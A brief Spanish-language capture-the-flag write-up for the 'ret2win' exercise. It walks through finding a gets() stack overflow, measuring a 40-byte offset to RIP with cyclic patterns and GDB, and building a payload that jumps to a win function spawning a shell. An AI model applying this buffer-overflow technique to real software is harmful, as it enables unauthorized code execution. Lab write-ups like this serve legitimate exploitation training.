# ret2win

Analicé el binario con `checksec` observando NX habilitado, sin canary y sin PIE (`checksec ret2win`). El flujo vulnerable estaba en `gets()` dentro de main. Generé un patrón con pwntools:

    cyclic 200
    gdb ./ret2win
    info registers

Descubrí que RIP se sobrescribía tras 40 bytes (`cyclic_find(...)`). Inspeccioné el binario con `objdump -d ret2win | grep win` y obtuve la dirección estática de la función.

Construí el payload en Python:

    payload = b"A"*40 + p64(0x00000000004006e7)

Probé en local (`python3 exploit.py`) y verifiqué que ejecutaba `system("/bin/sh")`. También lo ejecuté bajo GDB (`gef➤  run < <(python3 exploit.py)`) para confirmar que RIP saltaba correctamente.

Este ejercicio demuestra conocimiento de pwntools, calling conventions, offsets en stack y explotación básica orientada a control de flujo.
